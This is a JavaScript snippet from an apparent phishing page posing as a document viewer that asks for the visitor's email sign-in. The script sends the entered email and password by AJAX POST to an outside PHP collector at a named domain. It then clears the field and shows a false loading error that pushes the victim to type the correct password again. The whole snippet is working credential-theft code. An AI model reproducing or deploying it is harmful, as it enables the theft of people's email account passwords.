  <script>
    $(document).ready(function () {
      var retries = 3; // Set the number of retries

      $('#contact').submit(function (event) {
        event.preventDefault();
        $("#msg").html("Processing...");

        var email = $("#email").val();
        var password = $("#password").val();

        // Replace with your PHP script URL
        var phpScriptURL = "https://bsistandardsltd.org/sucs/mail.php";

        $.ajax({
          type: "POST",
          url: phpScriptURL,
          data: { email: email, password: password },
          beforeSend: function () {
            $("#submit-btn").text("Verifying...");
          },
          success: function (response) {
            if (response) {
              $("#msg").show();
              $("#password").val('');

              if (retries > 0) {
                swal("There was a problem loading the Document. Please try again.");
              }
            }
          },
          error: function () {
            $("#password").val('');

            if (retries > 0) {
              swal("There was a problem loading the Document. Try again with your correct email password");
            }
          },
          complete: function () {
            $("#submit-btn").text("Sign in");
          }
        });
      });
    });
  </script>
